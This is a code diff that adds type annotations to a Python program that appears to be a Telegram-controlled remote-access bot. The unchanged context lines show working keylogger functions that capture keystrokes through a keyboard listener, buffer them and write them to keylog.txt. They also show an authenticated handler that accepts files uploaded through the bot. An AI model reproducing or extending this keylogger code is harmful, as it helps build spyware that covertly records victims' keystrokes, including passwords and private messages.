@@ -41,7 +41,7 @@ def authenticated(func: callable) -> callable:
         func(message)
     return wrapper
 
-def on_key_press(key):
+def on_key_press(key) -> None:
     global keylog_buffer, keylogger_active
     if not keylogger_active:
         return
@@ -57,20 +57,20 @@ def on_key_press(key):
     if len(keylog_buffer) >= 100:
         flush_keylogs()
 
-def flush_keylogs():
+def flush_keylogs() -> None:
     global keylog_buffer
     if keylog_buffer:
         with open('keylog.txt', 'a', encoding='utf-8') as f:
             f.write(''.join(keylog_buffer))
         keylog_buffer = []
 
-def start_keylogger():
+def start_keylogger() -> None:
     global keylogger_active, keylog_listener
     keylogger_active = True
     keylog_listener = keyboard.Listener(on_press=on_key_press)
     keylog_listener.start()
 
-def stop_keylogger():
+def stop_keylogger() -> None:
     global keylogger_active
     keylogger_active = False
     if keylog_listener:
@@ -553,7 +553,7 @@ def upload_command(message: telebot.types.Message) -> None:
 
 @bot.message_handler(content_types=['document', 'photo', 'video', 'audio'])
 @authenticated
-def handle_upload(message):
+def handle_upload(message: telebot.types.Message) -> None:
     global waiting_for_upload
     if waiting_for_upload:
         try:
